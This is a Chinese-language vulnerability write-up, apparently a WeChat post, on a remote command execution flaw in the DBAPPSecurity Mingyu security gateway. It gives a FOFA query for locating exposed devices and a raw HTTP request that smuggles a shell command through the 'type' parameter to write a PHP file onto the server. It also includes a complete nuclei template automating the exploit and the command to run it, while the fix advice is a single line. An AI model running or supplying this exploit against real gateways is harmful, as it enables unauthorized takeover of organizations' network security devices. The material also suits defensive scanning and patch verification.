<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/kXWoQ7C4o-JgAsqfMWv5_g)

免责申明：**本文内容为学习笔记分享，仅供技术学习参考，请勿用作违法用途，任何个人和组织利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责，与作者无关！！！**

**福利：小编整理了大量电子书和护网常用工具，在文末免费获取。**

01

—

漏洞名称

安恒明御安全网关 aaa_portal_auth_config_reset 远程命令执行漏洞

02

—  

漏洞影响

安恒明御安全网关

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BP9roYEGZbVybeFsQmOuk4bRNpG05bWiaQtCibVYv2oRhIXEj60fmTjMMMlrDicvTvNA1jtstqkS4T3A/640?wx_fmt=png&from=appmsg)

03

—  

漏洞描述

明御安全网关秉持安全可视、简单 有效的只理念，以资产为视角，构建全流程防御的下一代安全防护体系，并融合传统防火墙、入侵检测、入侵防御系统、防病毒网关、上网行为管控、VPN 网关、威胁情报等安全模块于一体的智慧化安全网关。明御安全网关 aaa_portal_auth_config_reset 接口处存在 RCE 漏洞，攻击者通过漏洞可以获取服务器权限。

04

—  

FOFA 搜索语句

  

```
title="明御安全网关"

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BP9roYEGZbVybeFsQmOuk4bicgWhbE3R8Xibqbxmqjrola5kaVFbiaYcJOHLJqSl9HjppjFy6yibib1fGQ/640?wx_fmt=png&from=appmsg)

05

—  

漏洞复现

第一步，向靶场发送如下数据包

```
GET /webui/?g=aaa_portal_auth_config_reset&type=%0aecho%20%27%3C%3Fphp%20echo%20%22assdwdmpidmsbzoabahpjhnokiduw%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2Ftxzfsrur.php%0a HTTP/1.1
Host: x.x.x.xx.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close

```

第二步，查看生成的文件

```
http://x.x.x.x/astdfkhl.php

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BP9roYEGZbVybeFsQmOuk4b1LLibC5RwSXBknH6fic4JiaxCrIodkzDR1HDlUwKoEIXhKXIibqgAULrDA/640?wx_fmt=png&from=appmsg)

漏洞复现成功

06

—  

nuclei poc

poc 文件内容如下

```
id: dbapp-mingyu-aaa_portal_auth_config_reset-rce
info:
  name: 安恒明御安全网关 aaa_portal_auth_config_reset 远程命令执行漏洞
  author: fgz
  severity: critical
  description: 明御安全网关秉持安全可视、简单 有效的只理念，以资产为视角，构建全流程防御的下一代安全防护体系，并融合传统防火墙、入侵检测、入侵防御系统、防病毒网关、上网行为管控、VPN网关、威胁情报等安全模块于一体的智慧化安全网关。明御安全网关aaa_portal_auth_config_reset接口处存在RCE漏洞，攻击者通过漏洞可以获取服务器权限.
  metadata:
    max-request: 1
    fofa-query: title="明御安全网关"
    verified: true
variables:
  file_name: "\{\{to_lower(rand_text_alpha(8))\}\}"
  file_content: "\{\{to_lower(rand_text_alpha(30))\}\}"
requests:
  - raw:
      - |+
        GET /webui/?g=aaa_portal_auth_config_reset&type=%0aecho%20%27%3C%3Fphp%20echo%20%22\{\{file_content\}\}%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2F\{\{file_name\}\}.php%0a HTTP/1.1
        Host: \{\{Hostname\}\}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Connection: close
      - |
        GET /\{\{file_name\}\}.php HTTP/1.1
        Host: \{\{Hostname\}\}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip
    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, '\{\{file_content\}\}')"

```

运行 POC

```
nuclei.exe -t mypoc/安恒/dbapp-mingyu-aaa_portal_auth_config_reset-rce.yaml -u http://192.168.40.130:8080

```

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BP9roYEGZbVybeFsQmOuk4b6kL7WibJp4rL6SX1T3dlabTk5Gl65C6fnXfMgG89ticVf1liaTjV2JXZg/640?wx_fmt=png&from=appmsg)

07

—  

修复建议

升级到最新版本。

08

—  

福利领取

关注公众号，在公众号主页点发消息发送关键字免费领取。

后台发送【**工具**】获取渗透工具包

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BO3VtNCUQ6Bllhiag7ljEfRGYUNjiaPbSgc1bgPKxIibrYjsbZiaLcWPec8Gd6zLBlODFOCCAbDDvicEAw/640?wx_fmt=png&from=appmsg)

后台发送【**电子书**】获取电子书资源包

![图片](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BO3VtNCUQ6Bllhiag7ljEfRGfkkQLABlhLdFkF5eAv8Jm1yF2wpq7zdFbw0slibDtK4H1Rbm0wuSDBA/640?wx_fmt=png&from=appmsg)